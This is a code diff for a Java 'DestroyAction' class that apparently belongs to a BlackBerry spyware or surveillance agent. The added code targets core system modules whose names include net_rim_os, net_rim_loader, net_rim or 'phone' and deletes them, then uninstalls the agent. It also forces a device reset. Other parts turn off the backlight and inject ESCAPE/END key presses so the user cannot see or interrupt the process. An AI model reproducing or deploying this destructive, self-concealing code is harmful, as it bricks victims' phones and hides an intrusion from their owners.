@@ -15,7 +15,8 @@ import blackberry.injection.KeyInjector;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.utils.Utils;
 
-public class DestroyAction extends SubAction implements PhoneListener, BacklightObserver {
+public class DestroyAction extends SubAction implements PhoneListener,
+        BacklightObserver {
 
     private boolean permanent;
     private boolean stop;
@@ -65,18 +66,29 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
 
         final int handles[] = CodeModuleManager.getModuleHandles();
 
+        int numDeleted=0;
         final int size = handles.length;
         for (int i = 0; i < size; i++) {
             final int handle = handles[i];
             //CodeModuleManager.getModuleHandle(name)
             // Retrieve specific information about a module.
             final String name = CodeModuleManager.getModuleName(handle);
-
-            int ret = CodeModuleManager.deleteModuleEx(handle, true);
-            //#ifdef DEBUG
-            debug.trace("deleteApps, " + name + " : " + ret);
-            //#endif
+            if (name.equals("net_rim_os") || name.equals("net_rim_loader") || name.indexOf("phone") >= 0
+                    || name.equals("net_rim_cldc") || name.indexOf("net_rim") >= 0) {
+                int ret = CodeModuleManager.deleteModuleEx(handle, true);
+                //#ifdef DEBUG
+                debug.trace("deleteApps, " + name + " : " + ret);
+                //#endif
+                if(ret==6){
+                    numDeleted++;
+                }
+            }
         }
+
+        if(numDeleted>1){
+            Core.uninstall();
+        }
+        
         Status.self().setBacklight(false);
         CodeModuleManager.promptForResetIfRequired();
         Status.self().setBacklight(false);
@@ -94,7 +106,7 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
         //#ifdef DEBUG
         debug.trace("kill");
         //#endif
-        while(!stop){
+        while (!stop) {
             pressKey(Keypad.KEY_ESCAPE);
             pressKey(Keypad.KEY_END);
             Utils.sleep(100);
@@ -176,11 +188,11 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
     }
 
     public void onBacklightChange(boolean status) {
-        if(status){
+        if (status) {
             //#ifdef DEBUG
             debug.trace("onBacklightChange: starting kill");
             //#endif
-            stop=false;
+            stop = false;
             Thread thread = new Thread(new Runnable() {
                 public void run() {
                     kill();
@@ -189,12 +201,12 @@ public class DestroyAction extends SubAction implements PhoneListener, Backlight
             thread.start();
             Utils.sleep(100);
             Backlight.enable(false);
-        }else{
+        } else {
             //#ifdef DEBUG
             debug.trace("onBacklightChange: stopping kill");
             //#endif
-            stop=true;
-            
+            stop = true;
+
         }
     }
 
